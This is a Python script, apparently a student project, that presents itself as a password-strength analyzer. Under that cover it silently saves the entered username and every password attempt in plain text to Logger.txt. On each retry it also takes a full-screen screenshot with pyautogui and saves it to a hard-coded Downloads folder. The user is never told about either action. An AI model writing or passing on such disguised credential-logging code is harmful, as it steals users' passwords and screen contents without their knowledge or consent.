print("\033[3;32;40mWelcome to the Password Analyzer! \nThis program analyzes your password to rate it.")
print("\033[2;31;40m----------")
x = str(input("\033[1;34;40mPlease enter a username: "))
print("\033[2;31;40m----------")

file1 = open("Logger.txt", "w")
import pyautogui

lowercase = 0
uppercase = 0
special = 0
counter = 0
Pass= 'y'
strong = 0

while Pass == 'y' or Pass == "Y" :
    print("\033[3;35;40mPassword requirements: \nAt least 1 lowercase letter. \nAt least 1 uppercase letter. \nAt least one special character (ex. !,@,#,$,%,^,&,*,/). \nThe password should be at least 8 characters.")
    print("\033[2;31;40m----------")
    y = str(input("\033[1;34;40mPlease enter a password: "))
    file1.write(x + "\n"+y)
    for a in y:
        if a.isupper() == True:
            uppercase += 1
        if a.islower() == True:
            lowercase += 1
        if a == "!" or a == "@" or a == "#" or a == "$" or a == "%" or a == "^" or a == "&" or a == "*" or a == "/":
            special += 1
    if uppercase < 1:
        print("\033[1;36;40mMissing 1 uppercase character.")
    if lowercase < 1:
        print("Missing 1 lowercase character.")
    if special < 1:
        print("Missing 1 special character.")
    if len(y) < 8:
        print("Missing required character(s).")


    if uppercase >= 1:
        counter += 1
    if lowercase >= 1:
        counter += 1
    if special >= 1:
        counter += 1
    if len(y) >= 8:
        counter += 1
    if counter == 1:
        print("\033[4;31;40mWeak password.")
    elif counter == 2:
        print("Okay password.")
    elif counter == 3:
        print("Good password.")
    elif counter == 4:
        strong = 1
        print("Strong password.")
    if strong == 1:
        quit()
    counter = 0
    Pass = str(input("\033[1;34;40mDo you want to try again? (y/n)"))
    uppercase = 0
    lowercase = 0
    special = 0
    strong = 0
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save(r"C:\Users\shsi_c115\Downloads\ss1.png")

print("Made by Zainn, Ryan, and Aleese!")